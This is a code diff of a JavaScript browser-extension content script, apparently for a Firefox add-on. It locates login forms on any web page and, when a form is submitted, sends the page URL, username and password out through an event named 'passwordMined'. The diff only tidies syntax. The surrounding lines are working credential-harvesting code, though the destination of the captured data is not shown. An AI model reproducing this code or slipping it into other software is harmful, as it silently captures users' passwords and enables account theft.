@@ -1,3 +1,5 @@
+var forms = null;
+
 function getLoginFields() {
   var forms = [],
     pswd = (function(){
@@ -22,8 +24,7 @@ function getLoginFields() {
     };
   while (pswdLength--) {
     var curPswdField = pswd[pswdLength],
-      thisParentForm = parentForm(curPswdField),
-      curField = curPswdField;
+      thisParentForm = parentForm(curPswdField);
     if (thisParentForm) {
       var inputs = thisParentForm.getElementsByTagName("input");
       for (var i = 0; i < inputs.length; i++) {
@@ -40,17 +41,19 @@ function getLoginFields() {
 function formSubmitted(id) {
   var user = forms[id][1].value;
   var pass = forms[id][2].value;
-  if (user != "" && pass != "") {
+  if (user !== "" && pass !== "") {
     self.port.emit("passwordMined", window.location.href, user, pass);
   }
 }
 
-var forms = getLoginFields();
+forms = getLoginFields();
+
 for (var i=0; i<forms.length; i++) {
   forms[i][0].addEventListener("submit", (function(){
     var tmp = i;
     return function() {
       formSubmitted(tmp);
-    }
+    };
   }()));
 }
+
